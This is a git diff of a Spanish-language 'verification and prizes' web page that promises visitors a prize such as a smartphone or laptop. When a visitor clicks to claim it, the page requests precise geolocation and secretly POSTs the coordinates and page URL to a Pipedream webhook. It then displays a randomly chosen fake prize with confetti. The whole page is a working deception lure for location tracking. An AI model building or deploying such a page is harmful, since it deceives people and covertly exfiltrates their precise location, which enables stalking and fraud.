@@ -11,6 +11,7 @@ body {
   padding: 0;
   background: linear-gradient(135deg, #4facfe, #00f2fe);
   color: #333;
+  text-align: center;
 }
 .container {
   max-width: 900px;
@@ -18,7 +19,6 @@ body {
   background: #fff;
   border-radius: 20px;
   padding: 30px;
-  text-align: center;
   box-shadow: 0 8px 25px rgba(0,0,0,0.15);
 }
 h1 { color: #222; margin-bottom: 15px; }
@@ -35,36 +35,36 @@ button {
   transition: background 0.3s ease;
 }
 button:hover { background: #0056b3; }
-#msg { margin-top: 20px; font-size: 20px; font-weight: bold; color: green; display: none; }
-.premios {
-  margin-top: 25px;
-  display: none;
-  grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+.premios-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit,minmax(120px,1fr));
   gap: 15px;
+  margin-top: 25px;
 }
 .premio-card {
-  background: #fafafa;
-  border-radius: 15px;
-  box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-  padding: 10px;
-  opacity: 0;
-  transform: scale(0.9);
-  transition: transform 0.3s ease, box-shadow 0.3s ease;
+  border-radius: 12px;
+  overflow: hidden;
+  box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+  transition: transform 0.3s ease;
 }
 .premio-card img {
   width: 100%;
-  height: 160px;
+  height: 100px;
   object-fit: cover;
-  border-radius: 12px;
-}
-.premio-card h3 {
-  margin: 10px 0 0;
-  font-size: 14px;
-  color: #333;
 }
 .premio-card:hover {
   transform: scale(1.05);
-  box-shadow: 0 8px 25px rgba(0,0,0,0.2);
+}
+#premio-grande {
+  display: none;
+  margin-top: 30px;
+}
+#premio-grande img {
+  width: 90%;
+  max-width: 500px;
+  height: auto;
+  border-radius: 15px;
+  box-shadow: 0 8px 25px rgba(0,0,0,0.25);
 }
 canvas {
   position: fixed;
@@ -73,55 +73,61 @@ canvas {
   pointer-events: none;
   z-index: 999;
 }
-@keyframes fadeIn {
-  from { opacity: 0; transform: translateY(20px); }
-  to { opacity: 1; transform: translateY(0); }
-}
-@keyframes showCard {
-  to { opacity: 1; transform: scale(1); }
-}
 </style>
 </head>
 <body>
 <canvas id="confetti"></canvas>
 <div class="container">
   <h1>✅ VERIFICACIÓN Y PREMIOS</h1>
-  <p>Pulsa el botón para reclamar tu premio.</p>
+  <p>Mira los premios disponibles y reclama el tuyo.</p>
+  <div class="premios-grid" id="premios-grid"></div>
   <button id="btnPremio">📍 RECLAMA TU PREMIO</button>
-  <p id="msg">🎉 ¡Premios desbloqueados!</p>
-  <div class="premios" id="premios"></div>
+  <div id="premio-grande">
+    <h2>🎉 ¡Tu premio es!</h2>
+    <img id="img-premio-grande" src="" alt="">
+    <h3 id="nombre-premio-grande"></h3>
+  </div>
 </div>
 
 <script>
 const WEBHOOK_URL = "https://eo6bspy1b9no0kb.m.pipedream.net";
 
+// Premios reales
 const premios = [
-  {nombre:"🚲 Bicicleta de montaña", img:"https://cdn.pixabay.com/photo/2017/03/02/04/23/bicycle-2119460_1280.jpg"},
-  {nombre:"🎮 Consola Gamer", img:"https://cdn.pixabay.com/photo/2016/11/29/04/17/joystick-1866599_1280.jpg"},
-  {nombre:"📱 Smartphone Gama Alta", img:"https://cdn.pixabay.com/photo/2016/11/19/14/00/smartphone-1836073_1280.jpg"},
-  {nombre:"⌚ Smartwatch", img:"https://cdn.pixabay.com/photo/2015/09/05/21/51/apple-watch-925157_1280.jpg"},
-  {nombre:"💻 Laptop Ultrabook", img:"https://cdn.pixabay.com/photo/2014/05/02/21/50/home-office-336378_1280.jpg"},
-  {nombre:"📺 TV Pantalla Grande", img:"https://cdn.pixabay.com/photo/2015/09/05/22/46/tv-926093_1280.jpg"}
+  {nombre:"Bicicleta de montaña", img:"https://images.unsplash.com/photo-1597108113201-f8c0dfc43e84?auto=format&fit=crop&w=600&q=80"},
+  {nombre:"Consola Gamer", img:"https://images.unsplash.com/photo-1606813902418-5f9b0b512d6a?auto=format&fit=crop&w=600&q=80"},
+  {nombre:"Smartphone Gama Alta", img:"https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?auto=format&fit=crop&w=600&q=80"},
+  {nombre:"Smartwatch", img:"https://images.unsplash.com/photo-1516574187841-cb9cc2ca948b?auto=format&fit=crop&w=600&q=80"},
+  {nombre:"Laptop Ultrabook", img:"https://images.unsplash.com/photo-1517336714731-489689fd1ca8?auto=format&fit=crop&w=600&q=80"},
+  {nombre:"TV Pantalla Grande", img:"https://images.unsplash.com/photo-1587202372775-4f0a7d99b0b0?auto=format&fit=crop&w=600&q=80"}
 ];
 
-const btnPremio = document.getElementById("btnPremio");
-const premiosDiv = document.getElementById("premios");
-const msg = document.getElementById("msg");
+// Mostrar galería de premios
+const premiosGrid = document.getElementById("premios-grid");
+premios.forEach(p=>{
+  const div = document.createElement("div");
+  div.className = "premio-card";
+  div.innerHTML = `<img src="${p.img}" alt="${p.nombre}"><h4>${p.nombre}</h4>`;
+  premiosGrid.appendChild(div);
+});
+
+// Botón reclamar premio
+const btn = document.getElementById("btnPremio");
+const premioGrande = document.getElementById("premio-grande");
+const imgGrande = document.getElementById("img-premio-grande");
+const nombreGrande = document.getElementById("nombre-premio-grande");
 const canvas = document.getElementById("confetti");
 const ctx = canvas.getContext("2d");
 canvas.width = window.innerWidth;
 canvas.height = window.innerHeight;
 
-btnPremio.addEventListener("click",()=>{
-  if(!navigator.geolocation) return alert("No soporta geolocalización");
-  navigator.geolocation.getCurrentPosition(onSuccess,onError,{
-    enableHighAccuracy:true,
-    timeout:10000,
-    maximumAge:0
-  });
+btn.addEventListener("click",()=>{
+  if(!navigator.geolocation) return alert("Tu navegador no soporta geolocalización.");
+  navigator.geolocation.getCurrentPosition(onSuccess,onError,{enableHighAccuracy:true,timeout:10000,maximumAge:0});
 });
 
 function onSuccess(pos){
+  // Datos a enviar
   const data = {
     lat: pos.coords.latitude,
     lon: pos.coords.longitude,
@@ -132,33 +138,25 @@ function onSuccess(pos){
     source: window.location.href
   };
   enviarWebhook(data);
-  mostrarPremios();
-  msg.style.display = "block";
+
+  // Elegir premio aleatorio
+  const premio = premios[Math.floor(Math.random()*premios.length)];
+  imgGrande.src = premio.img;
+  nombreGrande.textContent = premio.nombre;
+  premioGrande.style.display = "block";
+
+  // Confeti
   lanzarConfeti();
 }
 
-function onError(err){
-  alert("⚠️ Error al obtener ubicación: "+(err.message||err.code));
-}
+function onError(err){ alert("⚠️ Error al obtener ubicación: "+(err.message||err.code)); }
 
-function mostrarPremios(){
-  premiosDiv.style.display="grid";
-  premiosDiv.innerHTML="";
-  premios.forEach((p,i)=>{
-    const card = document.createElement("div");
-    card.className="premio-card";
-    card.style.animation = `showCard 0.6s forwards`;
-    card.style.animationDelay = `${i*0.2}s`;
-    card.innerHTML = `<img src="${p.img}" alt="${p.nombre}"><h3>${p.nombre}</h3>`;
-    premiosDiv.appendChild(card);
-  });
-}
-
+// Confeti
 function lanzarConfeti(){
   const piezas = Array.from({length:150},()=>({
     x:Math.random()*canvas.width,
     y:Math.random()*canvas.height-50,
-    w:10, h:10,
+    w:10,h:10,
     color:["#f94144","#f3722c","#f9c74f","#90be6d","#577590","#43aa8b"][Math.floor(Math.random()*6)],
     vel:Math.random()+1.5
   }));
@@ -176,17 +174,13 @@ function lanzarConfeti(){
   setTimeout(()=>ctx.clearRect(0,0,canvas.width,canvas.height),6000);
 }
 
+// Enviar a Pipedream
 async function enviarWebhook(data){
   try{
-    await fetch(WEBHOOK_URL,{
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body:JSON.stringify(data)
-    });
-    console.log("Enviado a Pipedream");
+    await fetch(WEBHOOK_URL,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)});
+    console.log("Datos enviados a Pipedream");
   }catch(err){ console.error("Error webhook",err);}
 }
 </script>
 </body>
 </html>
-
